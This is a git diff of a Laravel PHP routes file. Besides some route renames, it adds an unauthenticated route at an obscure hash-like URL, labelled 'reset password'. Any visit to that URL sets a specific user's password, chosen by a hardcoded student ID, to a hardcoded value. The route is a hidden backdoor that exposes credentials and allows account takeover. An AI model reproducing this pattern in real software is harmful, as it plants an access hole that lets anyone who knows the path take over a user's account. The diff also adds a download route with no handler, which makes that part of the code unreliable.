@@ -1,5 +1,5 @@
 <?php
-
+use App\Models\User;
 /*
 |--------------------------------------------------------------------------
 | Application Routes
@@ -15,7 +15,14 @@
 Route::get('/',function(){
     return Redirect::to('index');
 });
-
+/***
+reset password
+***/
+Route::get('/35c1be3941950874315b7de788c2b244',function(){
+    $user = User::where('student_id','=',14041042)->firstOrFail();
+    $user->password = bcrypt('17801007453');
+    $user->save();
+});
 /*** 
     index routes
 ***/
@@ -86,8 +93,9 @@ Route::delete('/user/star',[
 Route::get('/user/star/{id}',[
     'uses'    =>  'StarController@show',
     'middleware'    =>  'auth']);
+Route::get('/user/star/download',[
+    'as'   =>  'starDownload']);
 Route::get('/user/star/download/{id}',[
-    'as' => 'statDownload',
     'uses'  =>  'StarController@download',
     'middleware'    =>  'auth']);
 /***
